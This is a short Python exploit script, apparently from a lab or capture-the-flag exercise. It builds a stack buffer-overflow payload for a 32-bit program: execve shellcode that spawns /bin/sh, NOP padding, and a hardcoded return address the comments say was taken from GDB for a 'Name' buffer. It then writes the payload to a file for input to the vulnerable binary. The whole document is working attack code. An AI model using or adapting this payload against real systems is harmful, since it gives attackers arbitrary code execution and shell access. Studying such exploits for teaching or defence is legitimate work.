import sys, struct

# 32-bit shellcode to spawn a shell
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Address of the Name buffer (found using GDB)
name_address = 0x80ef320  

# Calculate the padding needed
padding_length = 52 - len(shellcode)- 4 # 52 bytes total - length of shellcode
padding = b"\x90" * padding_length  # NOP sled for padding

# Create the payload
payload = shellcode  # Place shellcode at the start
payload += padding  # Add padding
payload += struct.pack("<I", name_address)  # Overwrite return address

# Write the payload to a file
with open("payload_input", "wb") as f:
    f.write(payload)

print(f"Payload length: {len(payload)} bytes")
